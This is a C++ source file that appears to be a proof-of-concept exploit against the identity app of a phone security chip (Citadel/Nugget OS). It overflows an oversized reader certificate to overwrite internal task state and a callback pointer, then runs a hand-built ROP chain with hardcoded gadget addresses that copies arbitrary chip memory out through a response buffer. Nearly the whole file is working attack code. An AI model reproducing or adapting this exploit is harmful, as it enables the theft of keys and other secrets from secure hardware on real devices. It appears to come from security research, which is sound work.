#include <app_nugget.h>
#include <byteswap.h>
#include <log.h>
#include <nos/NuggetClient.h>
#include <nos/device.h>
#include <nostypes.h>
#include <nosutils.h>
#include <nugget/app/identity/identity.pb.h>
#include <rop.h>
#include <string.h>
#include <utils.h>

#include <cassert>
#include <fstream>

using namespace nostypes;
using nos::NuggetClient;

static NosCmd *generate_payload() {
  nugget::app::identity::ICpushReaderCertRequest *request =
      new nugget::app::identity::ICpushReaderCertRequest();
  nugget::app::identity::ICpushReaderCertResponse *response =
      new nugget::app::identity::ICpushReaderCertResponse();

  size_t ic_struct_len = 328;
  // overwrite IC_struct + init_stack + final function pointer
  size_t cert_size = ic_struct_len + init_stack_size + 4;

  char x509Cert[cert_size];
  // overwrite all the IC_STRUCT
  memset(x509Cert, 0xff, ic_struct_len);

  // task_ready
  *(uint32_t *)(x509Cert + ic_struct_len) = 2;

  // task_enabled (idle, hook, nugget, avb)
  *(uint32_t *)(x509Cert + ic_struct_len + 4) = 1 + 2 + 4 + 16;

  // rest of the bytes from init_stack
  memcpy(x509Cert + ic_struct_len + 8, init_stack + 8, init_stack_size - 8);

  // overwrite nugget.request_buf with value of $sp when avb_GetState is called
  *(uint32_t *)(x509Cert + ic_struct_len + 0x24) = 0x12844;

  // replace avb_GetState callbacks
  uint32_t avb_GetState_new =
      0x58e03;  // add sp, #0x19c; pop {r4, r5, r6, r7, pc};
  *(uint32_t *)(x509Cert + ic_struct_len + init_stack_size) = avb_GetState_new;

  // important to set the size here, otherwise the internal copy will stop at
  // the first null char
  request->set_x509cert(x509Cert, cert_size);
  request->set_publickeyoffset(0);
  request->set_publickeysize(cert_size);

  NosCmd *cmd = new NosCmd(13, "", request, response);
  return cmd;
}

int ICpushReaderCert_exploit(std::vector<uint8_t> request,
                             std::vector<uint8_t> &result) {
  NosCmd *cmd = generate_payload();

  // init the client
  NuggetClient client(CITADEL_DEV);
  uint32_t rv;
  client.Open();

  if (!client.IsOpen()) exit(1);

  const nos_device &device = *client.Device();
  // reset device before starting to mess with it
  device.ops.reset(device.ctx);

  std::vector<uint8_t> vecres;
  vecres.resize(MAX_RESPONSE_SIZE);

  // send exploit
  // convert request to vector<uint8_t>
  std::string sreq;
  cmd->request->SerializeToString(&sreq);
  std::vector<uint8_t> vecreq(sreq.begin(), sreq.end());

  // call nos lib
  rv = client.CallApp(5, cmd->id, vecreq, &vecres);

  std::string response_str(vecres.begin(), vecres.end());
  cmd->reply->ParseFromString(response_str);

  vecres.clear();
  vecres.resize(MAX_RESPONSE_SIZE);

  rv = client.CallApp(0, 0x4242, request, &vecres);

  // call AVB GetState, which contains our first gadget
  vecreq.clear();
  result.clear();
  result.resize(MAX_RESPONSE_SIZE);

  rv = client.CallApp(1, 0, vecreq, &result);

  // print result
  print_vector(result);

  // close the client
  client.Close();
  delete (cmd);

  return 0;
}

int leak_data(uint32_t addr, uint32_t size) {
  // function printing some runtime data, useful to debug ROPchains
  uint32_t print_stats = 0x467b1;

  // first gadget: add sp, #0x19c; pop {r4, r5, r6, r7, pc};
  uint32_t regs[] = {

      // memcpy addr (53209) to read in 0x17ee0 (AVB_RESPONSE)
      0x41414141,  // r4 = junk
      0x41414141,  // r5 = junk
      0x41414141,  // r6 = junk
      0x41414141,  // r7 = junk

      0x4f965,  // pc = pop {r0, r4, r5, r6, pc};

      0x17ee0,     // r0 = AVB_RESPONSE
      0x41414141,  // r4 = junk
      0x41414141,  // r5 = junk
      0x41414141,  // r6 = junk

      0x515e3,  // pc = pop {r1, r2, r3, r4, r5, pc};

      addr,        // r1 = start address
      size,        // r2 = leak size
      0x633e9,     // r3 = memcpy
      0x41414141,  // r4 = junk
      0x41414141,  // r5 = junk

      0x4fe65,  // pc = blx r3; mov r0, r4; pop {r3, r4, r5, pc};

      0x41414141,  // r3 = junk
      0x41414141,  // r4 = junk
      0x41414141,  // r5 = junk
      0x4f965,     // pc = pop {r0, r4, r5, r6, pc};

      0x1df48,     // r0 = AVB_STRUCT
      0x41414141,  // r4 = junk
      0x41414141,  // r5 = junk
      0x41414141,  // r6 = junk

      0x515e3,  // pc = 0x0000d5e2 (0x0000d5e3): pop {r1, r2, r3, r4, r5, pc};

      0x0,         // r1 = status
      size,        // r2 = leak size
      0x50799,     // r3 = app_reply
      0x41414141,  // r4 = junk
      0x41414141,  // r5 = junk

      0x4fe65,  // pc = blx r3; mov r0, r4; pop {r3, r4, r5, pc};

      0x0,          // r3 = junk
      0x41414141,   // r4 = junk
      0x41414141,   // r5 = junk
      print_stats,  // pc = valid func
  };

  uint32_t payload_size = sizeof(regs);

  std::vector<uint8_t> request(payload_size * sizeof(uint32_t));
  request.assign((uint8_t *)regs,
                 ((uint8_t *)regs) + payload_size * sizeof(uint32_t));

  std::vector<uint8_t> result;
  uint32_t res = ICpushReaderCert_exploit(request, result);

  return res;
}